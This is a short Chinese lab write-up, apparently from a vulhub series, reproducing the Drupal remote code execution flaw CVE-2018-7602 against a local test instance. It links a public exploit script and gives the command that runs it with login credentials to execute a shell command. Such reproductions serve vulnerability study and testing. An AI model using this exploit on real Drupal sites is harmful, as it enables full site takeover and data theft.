# Drupal 远程代码执行漏洞（CVE-2018-7602）

###### by ADummy

### 0x00利用路线

​			poc直接打

### 0x01漏洞介绍

​			此漏洞源于对编号为CVE-2018-7600的漏洞修复不完全，导致补丁被绕过，攻击者可以利用Drupal网站漏洞，需要登录且有删除权限后触发执行恶意代码，导致网站被完全控制。

##### 影响版本

```
Drupal < 7.58
Drupal < 8.3.9
Drupal < 8.4.6
Drupal < 8.5.1
```

### 0x02漏洞复现

#### exp地址：[pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py)

#### payload

```
# "id"为要执行的命令 第一个drupal为用户名 第二个drupal为密码
python3 drupa7-CVE-2018-7602.py -c "id" drupal drupal http://127.0.0.1:8081/
```

​			**启动环境后，访问`http://your-ip:8080/`，您将看到drupal安装页面。使用“标准”配置文件完成drupal安装。由于没有mysql环境，因此在安装时应选择sqlite数据库。**

​				**默认页面**

![Drupal_Drupalgeddon_2RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_Drupalgeddon_2RCE_1.jpg)

​			**exp直接打 id被执行**

![Drupal_1RCE_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_1RCE_2.jpg)





​			

